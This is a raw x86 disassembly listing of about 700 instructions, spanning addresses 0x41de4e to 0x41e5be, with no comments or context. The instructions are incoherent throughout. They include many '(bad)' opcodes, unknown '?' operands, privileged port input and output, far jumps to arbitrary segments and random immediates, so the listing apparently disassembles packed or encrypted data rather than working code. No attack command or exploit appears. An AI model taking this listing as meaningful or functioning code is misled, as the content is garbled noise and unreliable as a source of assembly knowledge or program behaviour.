  41de4e:	mov    al,ds:0x4acd1f0b
  41de53:	ds dec esi
  41de55:	scas   eax,DWORD PTR es:[edi]
  41de56:	or     eax,0xb4869c11
  41de5b:	mov    BYTE PTR [esi+0x74],dl
  41de5e:	shl    BYTE PTR [ebp+0x1cba7332],0xa6
  41de65:	mov    esp,0xf5f83a6d
  41de6a:	add    dl,dl
  41de6c:	shr    dl,cl
  41de6e:	daa    
  41de6f:	cli    
  41de70:	jl     0x41de93
  41de72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de73:	test   BYTE PTR ds:0x4cdadf96,bh
  41de79:	or     al,0x47
  41de7b:	mov    al,0x1e
  41de7d:	jns    0x41de92
  41de7f:	adc    DWORD PTR [ecx+ebx*8],edi
  41de82:	lea    edi,[esi]
  41de84:	(bad)  
  41de85:	and    al,BYTE PTR [ecx+0x3d2a3485]
  41de8b:	mov    edi,0xd3dcb4ff
  41de90:	clc    
  41de91:	(bad)  
  41de92:	pop    ss
  41de93:	popa   
  41de94:	pusha  
  41de95:	in     al,dx
  41de96:	popf   
  41de97:	imul   edi,ecx,0x8fb884ac
  41de9d:	retf   
  41de9e:	push   0x84694f63
  41dea3:	mov    cl,0xa5
  41dea5:	in     al,0x38
  41dea7:	inc    eax
  41dea8:	jbe    0x41df14
  41deaa:	aam    0x7d
  41deac:	dec    ecx
  41dead:	loop   0x41de8e
  41deaf:	sahf   
  41deb0:	inc    ebx
  41deb1:	fmulp  st(1),st
  41deb3:	loopne 0x41de56
  41deb5:	xchg   esp,eax
  41deb6:	xchg   esi,eax
  41deb7:	jae    0x41df0b
  41deb9:	cmp    eax,0x49de0746
  41debe:	mov    cs,ebx
  41dec0:	test   DWORD PTR [ecx],edi
  41dec2:	(bad)
  41dec5:	pusha  
  41dec6:	loop   0x41de83
  41dec8:	pop    ebp
  41dec9:	out    0x52,al
  41decb:	push   eax
  41decc:	mov    esi,0x84bc84d7
  41ded1:	in     al,dx
  41ded2:	scas   al,BYTE PTR es:[edi]
  41ded3:	mov    dh,0xd1
  41ded5:	mov    ?,edx
  41ded7:	cdq    
  41ded8:	sub    eax,0xbe7e220e
  41dedd:	xchg   edx,ebp
  41dedf:	repnz dec eax
  41dee1:	test   BYTE PTR [ebx-0x30],0xe7
  41dee5:	inc    ecx
  41dee6:	xor    BYTE PTR [ebp-0x17],bl
  41dee9:	ret    
  41deea:	push   cs
  41deeb:	(bad)  
  41deec:	xchg   edx,eax
  41deed:	push   es
  41deee:	(bad)  
  41deef:	xchg   ebx,eax
  41def0:	enter  0x8757,0x45
  41def4:	enter  0x5058,0x4b
  41def8:	cmp    esi,ecx
  41defa:	test   BYTE PTR [eax+0x2a],ah
  41defd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41defe:	iret   
  41deff:	push   ecx
  41df00:	dec    edi
  41df01:	push   0xcd629b63
  41df06:	pop    esp
  41df07:	jmp    0x37af:0xf5d5de4d
  41df0e:	adc    eax,DWORD PTR [eax+0x12]
  41df11:	(bad)  
  41df12:	imul   ebx,DWORD PTR [ecx+0x2],0xe5f555d2
  41df19:	leave  
  41df1a:	loope  0x41df0f
  41df1c:	retf   
  41df1d:	data16 fs sbb dl,al
  41df21:	jp     0x41df49
  41df23:	and    cl,ch
  41df25:	sub    BYTE PTR [ebx+0x50],0x23
  41df29:	stc    
  41df2a:	mov    dh,0x75
  41df2c:	retf   0xd2ef
  41df2f:	ja     0x41df4a
  41df31:	pop    ebp
  41df32:	xchg   esi,eax
  41df33:	call   0x4db607a3
  41df38:	ja     0x41df9e
  41df3a:	push   0xffffffcb
  41df3c:	inc    edi
  41df3d:	xchg   esp,eax
  41df3e:	mov    edx,cs
  41df40:	xchg   BYTE PTR [ebp+0x3f],dl
  41df43:	and    BYTE PTR ds:0x57df3979,al
  41df49:	cli    
  41df4a:	and    ebx,DWORD PTR [eax+0x73]
  41df4d:	test   eax,0x3b94946f
  41df52:	fdivr  DWORD PTR [eax]
  41df54:	push   ds
  41df55:	pop    eax
  41df56:	pop    ecx
  41df57:	jns    0x41dfa8
  41df59:	xor    DWORD PTR [esi+0xd94d496],ebx
  41df5f:	es out 0x52,eax
  41df62:	scas   al,BYTE PTR es:[edi]
  41df63:	or     al,0xd2
  41df65:	ss inc esp
  41df67:	jg     0x41df3a
  41df69:	fwait
  41df6a:	or     DWORD PTR [edi],eax
  41df6c:	test   DWORD PTR [eax+0x62],0xc3e2e241
  41df73:	ins    DWORD PTR es:[edi],dx
  41df74:	sub    al,0xc1
  41df76:	cld    
  41df77:	lods   al,BYTE PTR ds:[esi]
  41df78:	mov    ds:0x4379172e,al
  41df7d:	mov    esi,DWORD PTR [ebx+0x3b]
  41df80:	or     ebp,DWORD PTR [esp+ebx*8]
  41df83:	int3   
  41df84:	daa    
  41df85:	test   ecx,edi
  41df87:	(bad)  
  41df88:	fistp  WORD PTR [esi*4-0x4deb17f3]
  41df8f:	daa    
  41df90:	ins    DWORD PTR es:[edi],dx
  41df91:	mov    eax,ds:0xec172d65
  41df96:	test   eax,0x9df5b72d
  41df9b:	int3   
  41df9c:	jge    0x41dfa6
  41df9e:	(bad)  [eax+0x642ffbbb]
  41dfa4:	add    al,al
  41dfa6:	mov    ebp,0x95fb000f
  41dfab:	aaa    
  41dfac:	nop
  41dfad:	jno    0x41dff9
  41dfaf:	adc    ebx,ecx
  41dfb1:	fiadd  DWORD PTR [edx-0x7c]
  41dfb4:	mov    ah,BYTE PTR [ecx+0x523a1106]
  41dfba:	inc    eax
  41dfbb:	xchg   esp,eax
  41dfbc:	fcmove st,st(3)
  41dfbe:	das    
  41dfbf:	push   ds
  41dfc0:	mov    ds:0x2f85aa92,al
  41dfc5:	jmp    0x41dff3
  41dfc7:	ds sub eax,0xc6414cdd
  41dfcd:	jecxz  0x41dfac
  41dfcf:	outs   dx,DWORD PTR ds:[esi]
  41dfd0:	dec    esi
  41dfd1:	or     eax,0x8861d7f5
  41dfd6:	popf   
  41dfd7:	loope  0x41df70
  41dfd9:	call   DWORD PTR [ebx-0x7]
  41dfdc:	xchg   eax,edi
  41dfde:	push   edx
  41dfdf:	xchg   ecx,eax
  41dfe0:	test   DWORD PTR [ecx],esi
  41dfe2:	enter  0x22db,0x64
  41dfe6:	ret    0xf9da
  41dfe9:	inc    edi
  41dfea:	mov    BYTE PTR [edx],bh
  41dfec:	sti    
  41dfed:	adc    DWORD PTR [edx],edx
  41dfef:	add    al,0x61
  41dff1:	sbb    BYTE PTR [eax],dh
  41dff3:	in     eax,0xc
  41dff5:	add    al,0x6e
  41dff7:	push   0xb602a5e5
  41dffc:	mov    edx,0x216b5257
  41e001:	fisttp QWORD PTR [ecx-0x8]
  41e004:	jle    0x41dfc1
  41e006:	loopne 0x41e00e
  41e008:	xor    BYTE PTR [edx-0x59],0x77
  41e00c:	pop    ebx
  41e00d:	std    
  41e00e:	sub    esi,DWORD PTR [ecx+0x6ff9509b]
  41e014:	xor    cl,BYTE PTR [edi+0x50]
  41e017:	loop   0x41e08f
  41e019:	fsubr  st(2),st
  41e01b:	leave  
  41e01c:	mov    dh,0x16
  41e01e:	fstp   DWORD PTR [esi*8-0x22a2ac7b]
  41e025:	and    DWORD PTR [ebx+0x36],eax
  41e028:	(bad)  
  41e02a:	gs cmc 
  41e02c:	adc    DWORD PTR [ebp+0x11],edi
  41e02f:	mov    dh,0xfc
  41e031:	sbb    eax,DWORD PTR [ebx]
  41e033:	shl    BYTE PTR [edx],0x35
  41e036:	sbb    eax,0x9a595cfe
  41e03b:	out    0x0,eax
  41e03d:	xor    ebx,ecx
  41e03f:	mov    ebx,0x1c060864
  41e044:	jp     0x41e000
  41e046:	add    DWORD PTR [edx],esi
  41e048:	mov    al,ds:0x8f0f8c4
  41e04d:	sub    al,0xfe
  41e04f:	pop    ebp
  41e050:	pop    ss
  41e051:	(bad)  
  41e052:	jmp    FWORD PTR [edi+0x2fa6ea48]
  41e058:	cmp    BYTE PTR [edx-0x8330cd6],0xe8
  41e05f:	or     ebp,0x34c0e993
  41e065:	dec    eax
  41e066:	push   ecx
  41e067:	out    0xb0,eax
  41e069:	or     bl,BYTE PTR [eax-0x31df80fb]
  41e06f:	pop    ds
  41e070:	repnz pop esi
  41e072:	add    eax,0x746ce324
  41e077:	imul   edx,DWORD PTR [ebx],0xffffffad
  41e07a:	and    edx,edi
  41e07c:	in     eax,0x89
  41e07e:	cs dec esp
  41e080:	push   cs
  41e081:	jnp    0x41e0c3
  41e083:	scas   al,BYTE PTR es:[edi]
  41e084:	popf   
  41e085:	push   ss
  41e086:	stos   DWORD PTR es:[edi],eax
  41e087:	int    0x67
  41e089:	mov    eax,ds:0x8d4d0ebc
  41e08e:	in     eax,dx
  41e08f:	fmul   DWORD PTR [ecx]
  41e091:	sar    BYTE PTR [eax+0x4f],0xbc
  41e095:	mov    al,0xde
  41e097:	sub    DWORD PTR [ebp+0x49a5d524],ecx
  41e09d:	jmp    0x7fdc2cea
  41e0a2:	pop    eax
  41e0a3:	inc    edx
  41e0a4:	or     DWORD PTR [edi-0x3406eaef],edx
  41e0aa:	rcr    BYTE PTR [edx-0xc6a8502],0x5b
  41e0b1:	pushf  
  41e0b2:	pop    ss
  41e0b3:	mov    cl,0xbd
  41e0b5:	out    0xe1,al
  41e0b7:	xor    eax,DWORD PTR [edx]
  41e0b9:	gs jge 0x41e0a4
  41e0bc:	inc    esi
  41e0bd:	cmc    
  41e0be:	int3   
  41e0bf:	jne    0x41e131
  41e0c1:	jb     0x41e0f1
  41e0c3:	mov    ch,0xb0
  41e0c5:	mov    al,0xea
  41e0c7:	out    dx,al
  41e0c8:	xchg   ebx,eax
  41e0c9:	mov    esp,0x6547836
  41e0ce:	mov    esp,0x38b3fe20
  41e0d3:	and    BYTE PTR [ebx-0x47],dh
  41e0d6:	das    
  41e0d7:	pop    eax
  41e0d8:	inc    esp
  41e0d9:	or     eax,edi
  41e0db:	pushf  
  41e0dc:	and    ch,BYTE PTR [ebx+0x8deae27]
  41e0e2:	jmp    0xc688725c
  41e0e7:	setno  dl
  41e0ea:	push   ds
  41e0eb:	test   al,0x2a
  41e0ed:	enter  0xeff0,0xbc
  41e0f1:	out    0xbb,eax
  41e0f3:	jnp    0x41e079
  41e0f5:	sub    DWORD PTR [ebx+0x77],esi
  41e0f8:	jb     0x41e091
  41e0fa:	adc    BYTE PTR [edi+0x1f0fcad3],0xb0
  41e101:	in     eax,dx
  41e102:	or     DWORD PTR [edx+0x6e040d13],ebx
  41e108:	(bad)  
  41e109:	lock jae 0x41e0c8
  41e10c:	std    
  41e10d:	pop    edi
  41e10e:	hlt    
  41e10f:	stc    
  41e110:	retf   0x8a1
  41e113:	mov    WORD PTR [edi],?
  41e115:	push   eax
  41e116:	mov    ah,0xd0
  41e118:	out    dx,eax
  41e119:	cld    
  41e11a:	out    0x5f,eax
  41e11c:	xor    ecx,DWORD PTR [esi]
  41e11e:	sbb    DWORD PTR [edi],ebx
  41e120:	ds mov ebx,0x6905bba7
  41e126:	ins    BYTE PTR es:[edi],dx
  41e127:	mov    ebp,0x2767c0b3
  41e12c:	push   esi
  41e12d:	out    dx,al
  41e12e:	mov    eax,ds:0x2646b5c3
  41e133:	cmp    eax,DWORD PTR ds:0x6be7517a
  41e139:	int3   
  41e13a:	dec    esi
  41e13b:	push   ds
  41e13c:	pushf  
  41e13d:	mov    DWORD PTR [edi-0x2e1ec8b9],edi
  41e143:	mov    cl,0x7
  41e145:	int    0xd9
  41e147:	add    eax,0xe673378
  41e14c:	xchg   edi,eax
  41e14d:	xor    DWORD PTR [ebx],ebp
  41e14f:	leave  
  41e150:	sub    BYTE PTR [esi-0x35],dh
  41e153:	psrld  mm0,QWORD PTR [edi-0x7c90656e]
  41e15a:	xchg   ebx,eax
  41e15b:	lds    eax,FWORD PTR [eax+0x7b92fde0]
  41e161:	xor    ecx,DWORD PTR [eax-0x75637d22]
  41e167:	adc    al,ch
  41e169:	inc    esp
  41e16a:	mov    cl,0x5d
  41e16c:	icebp  
  41e16d:	or     BYTE PTR [ebx-0xe],cl
  41e170:	retf   0x6e85
  41e173:	mov    BYTE PTR [eax],bl
  41e175:	mov    al,0xdd
  41e177:	xchg   ebp,eax
  41e178:	jmp    0x18393b59
  41e17d:	push   ecx
  41e17e:	jg     0x41e1bb
  41e180:	mov    bl,0x10
  41e182:	loop   0x41e1c1
  41e184:	out    dx,eax
  41e185:	xor    BYTE PTR [ecx+0x27],ah
  41e188:	shl    DWORD PTR ds:0xe73ae186,0x26
  41e18f:	inc    ebp
  41e190:	ins    DWORD PTR es:[edi],dx
  41e191:	popa   
  41e192:	cmp    al,0x66
  41e194:	push   esi
  41e195:	add    DWORD PTR [eax],ecx
  41e197:	jmp    0x41e1ed
  41e199:	repnz mov eax,ds:0x8ba36ecc
  41e19f:	scas   al,BYTE PTR es:[edi]
  41e1a0:	and    al,0xce
  41e1a2:	aad    0xdd
  41e1a4:	stc    
  41e1a5:	loope  0x41e162
  41e1a7:	xchg   bh,dh
  41e1a9:	je     0x41e222
  41e1ab:	pop    es
  41e1ac:	out    0x83,al
  41e1ae:	shl    BYTE PTR [esi+0x23f1d08e],0x39
  41e1b5:	mov    ch,0x6f
  41e1b7:	sub    al,0x20
  41e1b9:	jnp    0x41e185
  41e1bb:	sti    
  41e1bc:	in     eax,dx
  41e1bd:	jae    0x41e1b6
  41e1bf:	jge    0x41e196
  41e1c1:	add    DWORD PTR [edi+0xf21c362],ebp
  41e1c7:	xlat   BYTE PTR ds:[ebx]
  41e1c8:	test   DWORD PTR [edx+0x6f302672],0x50f63546
  41e1d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1d3:	iret   
  41e1d4:	mov    ebp,0x4028587a
  41e1d9:	cdq    
  41e1da:	pop    ss
  41e1db:	ds mov esp,0x6d3ac1fe
  41e1e1:	pop    edi
  41e1e2:	sbb    DWORD PTR [ebp-0x47],esp
  41e1e5:	adc    esi,DWORD PTR [edi]
  41e1e7:	xchg   ebp,eax
  41e1e8:	jb     0x41e1b9
  41e1ea:	jge    0x41e1a8
  41e1ec:	push   cs
  41e1ed:	fwait
  41e1ee:	into   
  41e1ef:	xchg   ecx,eax
  41e1f0:	cld    
  41e1f1:	cdq    
  41e1f2:	in     eax,0xae
  41e1f4:	outs   dx,DWORD PTR ds:[esi]
  41e1f5:	inc    esi
  41e1f6:	adc    DWORD PTR [ebp+0x49],edi
  41e1f9:	push   edi
  41e1fa:	add    DWORD PTR [ebx],0xb6a1355
  41e200:	in     al,0x79
  41e202:	jb     0x41e24e
  41e204:	jmp    0x9fee825f
  41e209:	aam    0xc0
  41e20b:	sub    eax,DWORD PTR [ebp+0x1e]
  41e20e:	mov    edx,DWORD PTR [edi+0x3c70e8a0]
  41e214:	or     al,0x76
  41e216:	mov    WORD PTR [edx+ecx*2-0x52adb4de],fs
  41e21d:	inc    edi
  41e21e:	mov    ds:0x25f4a37,al
  41e223:	int    0xb6
  41e225:	mov    ds:0xc69a70a1,al
  41e22a:	inc    ebp
  41e22b:	adc    eax,0x20158f6
  41e230:	mov    ch,0xd
  41e232:	or     eax,0x216c86ab
  41e237:	sub    al,0x2f
  41e239:	in     eax,0xab
  41e23b:	add    eax,0xb0748e87
  41e240:	sbb    BYTE PTR fs:[ebp-0x73],ah
  41e244:	inc    ecx
  41e245:	(bad)  
  41e246:	(bad)  
  41e247:	xor    dh,ch
  41e249:	jae    0x41e28d
  41e24b:	js     0x41e252
  41e24d:	xor    DWORD PTR [eax+eax*8],esi
  41e250:	sub    esi,ebp
  41e252:	jne    0x41e22a
  41e254:	mov    cs,WORD PTR [eax]
  41e256:	xchg   ebx,eax
  41e257:	fisttp QWORD PTR [edi+0x70a5e67]
  41e25d:	push   ss
  41e25e:	fwait
  41e25f:	push   eax
  41e260:	mov    ds:0xdf79d3a1,al
  41e265:	sbb    al,0xb3
  41e267:	push   ss
  41e268:	out    0x13,eax
  41e26a:	xlat   BYTE PTR ds:[ebx]
  41e26b:	adc    ebx,DWORD PTR [ecx]
  41e26d:	or     eax,0xc9fb1efc
  41e272:	cmp    BYTE PTR [edi+0x11a11192],bh
  41e278:	push   edx
  41e279:	jnp    0x41e226
  41e27b:	pop    eax
  41e27c:	xchg   edx,eax
  41e27d:	xchg   esi,eax
  41e27e:	popa   
  41e27f:	ja     0x41e267
  41e281:	pop    edx
  41e282:	pop    es
  41e283:	inc    eax
  41e284:	xchg   ecx,eax
  41e285:	mov    ecx,cs
  41e287:	daa    
  41e288:	out    0x84,al
  41e28a:	sbb    al,0x28
  41e28c:	xor    BYTE PTR [eax],bh
  41e28e:	ja     0x41e2c2
  41e290:	push   ebp
  41e291:	add    DWORD PTR [ebx-0x3e],edx
  41e294:	or     esi,0xffffffa3
  41e297:	dec    edi
  41e298:	xchg   ecx,eax
  41e299:	pushf  
  41e29a:	aam    0x0
  41e29c:	add    dh,BYTE PTR [ebx+0x3295e9d7]
  41e2a2:	sub    edi,DWORD PTR [esi+ebp*1-0x3eb448f]
  41e2a9:	xchg   edi,eax
  41e2aa:	stc    
  41e2ab:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2ad:	ret    0x6e09
  41e2b0:	(bad)  
  41e2b1:	mov    ecx,DWORD PTR [edi]
  41e2b3:	ja     0x41e294
  41e2b5:	mov    DWORD PTR [edi-0x40e4e028],esp
  41e2bb:	adc    bh,BYTE PTR [ebp-0x6f]
  41e2be:	loope  0x41e256
  41e2c0:	adc    eax,0x4835c049
  41e2c5:	je     0x41e30a
  41e2c7:	mov    BYTE PTR [esp+edi*8],dh
  41e2ca:	mov    bh,0xfe
  41e2cc:	je     0x41e298
  41e2ce:	ds cwde 
  41e2d0:	pushf  
  41e2d1:	addr16 into 
  41e2d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2d4:	pop    edi
  41e2d5:	leave  
  41e2d6:	fwait
  41e2d7:	ror    BYTE PTR [esi+0x49],1
  41e2da:	imul   eax,DWORD PTR [edx+0x370180d7],0xffffffa8
  41e2e1:	and    ebx,DWORD PTR [edx]
  41e2e3:	cmp    BYTE PTR [ebx-0x7c718ea7],ah
  41e2e9:	or     DWORD PTR [ecx-0x3a],ebx
  41e2ec:	pop    es
  41e2ed:	(bad)  
  41e2ee:	aam    0xdf
  41e2f0:	jle    0x41e354
  41e2f2:	add    BYTE PTR [ecx+0x0],dl
  41e2f5:	fisub  WORD PTR [eax-0x61a45416]
  41e2fb:	ins    DWORD PTR es:[edi],dx
  41e2fc:	and    ah,dh
  41e2fe:	les    ecx,FWORD PTR [edx+eax*8]
  41e301:	mov    edi,0x4544b10f
  41e306:	daa    
  41e307:	aas    
  41e308:	stc    
  41e309:	(bad)  
  41e30a:	and    esp,ebx
  41e30c:	mov    BYTE PTR [edx+0x43],cl
  41e30f:	je     0x41e325
  41e311:	push   0xffffffbe
  41e313:	nop
  41e314:	popf   
  41e315:	icebp  
  41e316:	dec    esp
  41e317:	pop    eax
  41e318:	add    eax,0x457ebe75
  41e31d:	adc    edx,ebp
  41e31f:	inc    eax
  41e320:	stc    
  41e321:	ds (bad) 
  41e323:	fidivr DWORD PTR [ecx]
  41e325:	js     0x41e32f
  41e327:	arpl   WORD PTR [edi],ax
  41e329:	and    eax,0xfb8db80e
  41e32e:	daa    
  41e32f:	xchg   bh,al
  41e331:	mov    ds:0xc176139,eax
  41e336:	mov    bl,bl
  41e338:	lds    edi,FWORD PTR [ecx+0x2e]
  41e33b:	sub    edi,esi
  41e33d:	push   ecx
  41e33e:	or     DWORD PTR [ebx+eiz*1-0xc],eax
  41e342:	pop    edi
  41e343:	imul   DWORD PTR [edx+ecx*8]
  41e346:	mov    ?,edx
  41e348:	outs   dx,DWORD PTR ds:[esi]
  41e349:	mov    esp,0xa36cf813
  41e34e:	imul   esi,DWORD PTR [edx],0xffffffb3
  41e351:	sbb    BYTE PTR [ecx],cl
  41e353:	and    edi,DWORD PTR [edi+0x4]
  41e356:	shl    BYTE PTR [ebp+0x1a],0xd3
  41e35a:	add    BYTE PTR [ebp+0x66],0x66
  41e35e:	mov    esi,0x3e2ab79a
  41e363:	pop    ax
  41e365:	push   ebp
  41e366:	add    BYTE PTR [ebp+0x36fd831b],ah
  41e36c:	inc    ebp
  41e36d:	push   0xffffffef
  41e36f:	jg     0x41e38e
  41e371:	cmp    DWORD PTR [edx],esi
  41e373:	jae    0x41e382
  41e375:	push   ebx
  41e376:	ins    BYTE PTR es:[edi],dx
  41e377:	cmp    BYTE PTR [edx+0x4d],al
  41e37a:	jne    0x41e37e
  41e37c:	in     eax,dx
  41e37d:	jl     0x41e2ff
  41e37f:	inc    edi
  41e380:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e381:	mov    DWORD PTR [ecx-0x72228b92],edi
  41e387:	mov    DWORD PTR [ecx],esp
  41e389:	in     al,dx
  41e38a:	in     eax,dx
  41e38b:	ror    DWORD PTR [eax-0x62],0x1d
  41e38f:	ja     0x41e317
  41e391:	jmp    0x4364f41b
  41e396:	inc    edi
  41e397:	inc    esi
  41e398:	fsubr  QWORD PTR [esi+eax*1]
  41e39b:	push   esp
  41e39c:	mov    eax,ds:0xa5a738be
  41e3a1:	scas   eax,DWORD PTR es:[edi]
  41e3a2:	call   0xcf6c:0x16c110b2
  41e3a9:	xchg   esi,eax
  41e3aa:	cmp    al,0x69
  41e3ac:	in     eax,dx
  41e3ad:	and    eax,0xed290fc0
  41e3b2:	cmp    eax,DWORD PTR [ebp-0x59a65985]
  41e3b8:	xor    al,0x7b
  41e3ba:	add    DWORD PTR [ecx-0x42],edx
  41e3bd:	pop    eax
  41e3be:	popf   
  41e3bf:	adc    bl,BYTE PTR [ebx-0x7f]
  41e3c2:	(bad)
  41e3c5:	sbb    BYTE PTR [eax+0x20577960],bh
  41e3cb:	jnp    0x41e36c
  41e3cd:	cmp    edx,esi
  41e3cf:	xchg   bp,ax
  41e3d1:	into   
  41e3d2:	mov    esp,0x78d68338
  41e3d7:	pmulhuw mm6,QWORD PTR [ecx+0x24]
  41e3db:	dec    ecx
  41e3dc:	into   
  41e3dd:	or     al,0x57
  41e3df:	pop    ds
  41e3e0:	inc    edx
  41e3e1:	rcl    DWORD PTR [eax],0xe2
  41e3e4:	int    0xe0
  41e3e6:	sbb    esp,esp
  41e3e8:	push   esi
  41e3e9:	sahf   
  41e3ea:	sub    edx,ebx
  41e3ec:	ret    0x1c78
  41e3ef:	rol    DWORD PTR [edx+0x5b],0xf0
  41e3f3:	pop    es
  41e3f4:	add    DWORD PTR [edx+0x3737fc63],ebp
  41e3fa:	fdiv   DWORD PTR [edx+edx*1+0x9]
  41e3fe:	inc    edx
  41e3ff:	mov    esi,0x2870c780
  41e404:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e405:	sahf   
  41e406:	retf   0xc722
  41e409:	sub    ebp,ebx
  41e40b:	sub    bl,BYTE PTR ds:0xb0bee1cb
  41e411:	cmp    eax,DWORD PTR [edx]
  41e413:	arpl   WORD PTR [eax+ebp*8],bp
  41e416:	outs   dx,DWORD PTR ds:[esi]
  41e417:	push   esi
  41e418:	push   esi
  41e419:	push   ebp
  41e41a:	int    0xfb
  41e41c:	cs mov al,0xf0
  41e41f:	out    0x56,al
  41e421:	pop    esp
  41e422:	cdq    
  41e423:	and    al,0x76
  41e425:	(bad)  
  41e426:	fmulp  st(3),st
  41e428:	stc    
  41e429:	push   edi
  41e42a:	enter  0x803c,0xd7
  41e42e:	mov    al,ds:0x84b89b49
  41e433:	mov    eax,0xf3f4b346
  41e438:	imul   eax,DWORD PTR [edi],0xffffffef
  41e43b:	inc    ebp
  41e43c:	cmp    al,bh
  41e43e:	sub    ebp,DWORD PTR [ebx+0x34]
  41e441:	xchg   esp,eax
  41e442:	and    al,0x30
  41e444:	mov    ds:0x1985eea2,al
  41e449:	push   es
  41e44a:	rol    BYTE PTR [eax-0x38],0x8
  41e44e:	popa   
  41e44f:	dec    esp
  41e450:	fcomp  st(7)
  41e452:	mov    ecx,0x4b8aedd0
  41e457:	xchg   DWORD PTR [ebp+0x3a630502],esi
  41e45d:	or     eax,0xa7c80bc2
  41e462:	push   esp
  41e463:	imul   esi,DWORD PTR [ebp-0xb],0x2446042d
  41e46a:	pop    es
  41e46b:	out    0x32,al
  41e46d:	jae    0x41e45a
  41e46f:	push   esp
  41e470:	lods   eax,DWORD PTR ds:[esi]
  41e471:	push   esi
  41e472:	nop
  41e473:	inc    ebp
  41e474:	test   al,0x18
  41e476:	ret    0xa69a
  41e479:	dec    esi
  41e47a:	or     bh,dl
  41e47c:	inc    esi
  41e47d:	push   ss
  41e47e:	jo     0x41e477
  41e480:	ror    ebx,0xe9
  41e483:	test   bh,cl
  41e485:	nop
  41e486:	sar    DWORD PTR [ecx-0x2835961c],1
  41e48c:	enter  0x1835,0x28
  41e490:	out    dx,eax
  41e491:	xchg   edi,eax
  41e492:	fnstenv [ebx-0x43]
  41e495:	adc    eax,0x2d96c88d
  41e49a:	lods   al,BYTE PTR fs:[esi]
  41e49c:	cmp    al,BYTE PTR [eax+eiz*4+0x30eff476]
  41e4a3:	or     DWORD PTR [edi+0x4c48553f],eax
  41e4a9:	cmp    BYTE PTR [edx],0x1b
  41e4ac:	pop    esp
  41e4ad:	pop    es
  41e4ae:	(bad)  
  41e4af:	repnz inc ebp
  41e4b1:	rcr    dl,cl
  41e4b3:	dec    ebx
  41e4b4:	dec    ebx
  41e4b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4b6:	das    
  41e4b7:	popf   
  41e4b8:	pop    esp
  41e4b9:	pop    eax
  41e4ba:	inc    eax
  41e4bb:	out    0x55,eax
  41e4bd:	dec    edx
  41e4be:	mov    bh,BYTE PTR [edx+0x43]
  41e4c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e4c2:	nop
  41e4c3:	xchg   ebx,eax
  41e4c4:	aam    0x61
  41e4c6:	ja     0x41e49e
  41e4c8:	mov    ecx,es
  41e4ca:	daa    
  41e4cb:	enter  0x3f8d,0x2e
  41e4cf:	push   ebx
  41e4d0:	jg     0x41e4d5
  41e4d2:	push   cs
  41e4d3:	jecxz  0x41e45c
  41e4d5:	cli    
  41e4d6:	mov    ebp,0x29ee9a47
  41e4db:	and    ah,ch
  41e4dd:	mov    ch,BYTE PTR [eax]
  41e4df:	scas   eax,DWORD PTR es:[edi]
  41e4e0:	xchg   esi,eax
  41e4e1:	cld    
  41e4e2:	xor    al,0x62
  41e4e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e4e5:	and    BYTE PTR [edx+eiz*8-0x62],dl
  41e4e9:	sti    
  41e4ea:	or     edx,eax
  41e4ec:	arpl   WORD PTR [ecx+0x3d],si
  41e4ef:	fdiv   st(5),st
  41e4f1:	aam    0xd
  41e4f3:	cli    
  41e4f4:	mov    edx,0x615a2f6b
  41e4f9:	push   edx
  41e4fa:	mov    ah,cl
  41e4fc:	aad    0x9a
  41e4fe:	pop    bx
  41e500:	lock push ds
  41e502:	xchg   edi,eax
  41e503:	test   al,0x76
  41e505:	fstp   QWORD PTR [eax+0x4e]
  41e508:	xchg   ebp,eax
  41e509:	sub    eax,0x72efca15
  41e50e:	test   eax,0xd95be1aa
  41e513:	pop    eax
  41e514:	retf   
  41e515:	iret   
  41e516:	ret    0xe69
  41e519:	nop
  41e51a:	sbb    al,0x70
  41e51c:	outs   dx,DWORD PTR ds:[esi]
  41e51d:	adc    eax,0x48200021
  41e522:	loope  0x41e551
  41e524:	mov    cl,0x3
  41e526:	push   es
  41e527:	lahf   
  41e528:	cmp    DWORD PTR [edx],edx
  41e52a:	dec    edi
  41e52b:	mov    ah,0x56
  41e52d:	inc    ebp
  41e52e:	mov    ah,0x7c
  41e530:	adc    DWORD PTR [edx],ebx
  41e532:	add    dh,BYTE PTR [eiz*4+0x4727fc12]
  41e539:	jne    0x41e589
  41e53b:	loope  0x41e58f
  41e53d:	fisttp WORD PTR [ebp-0x37]
  41e540:	xchg   edi,eax
  41e541:	call   0x4f72f6c6
  41e546:	loope  0x41e56a
  41e548:	out    0xcc,al
  41e54a:	adc    ebx,edi
  41e54c:	popf   
  41e54d:	xor    al,0x45
  41e54f:	inc    ebx
  41e550:	(bad)  
  41e552:	sub    cl,BYTE PTR [edi-0x20652c9f]
  41e558:	popf   
  41e559:	pop    edx
  41e55a:	cmp    DWORD PTR [eax+0x7d9e2b1b],esi
  41e560:	or     DWORD PTR [eax+0x59],esi
  41e563:	sub    BYTE PTR [ecx-0x7d],ah
  41e566:	aad    0x9f
  41e568:	sub    eax,0xb7b41ea2
  41e56d:	aaa    
  41e56e:	icebp  
  41e56f:	push   ecx
  41e570:	or     BYTE PTR [edi],ah
  41e572:	mov    ebp,0x6bdf3ac7
  41e577:	lock and ebx,DWORD PTR [ebp-0x310453d8]
  41e57e:	sbb    BYTE PTR [eax-0x67721998],al
  41e584:	imul   ebx,ebp,0x9492e93d
  41e58a:	jo     0x41e521
  41e58c:	enter  0x90ed,0xd7
  41e590:	mov    bh,BYTE PTR [edx]
  41e592:	add    eax,0x175948ba
  41e597:	fcmovne st,st(2)
  41e599:	stos   DWORD PTR es:[edi],eax
  41e59a:	cmp    eax,0x453859c9
  41e59f:	fisttp WORD PTR ds:0x62b28e26
  41e5a5:	or     eax,0xf375d275
  41e5aa:	das    
  41e5ab:	and    bl,BYTE PTR [edx+edx*4+0x69]
  41e5af:	xor    al,0x54
  41e5b1:	mov    ds:0x2a81b0de,al
  41e5b6:	rep stos BYTE PTR es:[edi],al
  41e5b8:	mov    al,ds:0x360a301d
  41e5bd:	lahf   
  41e5be:	sub    ebx,ebp
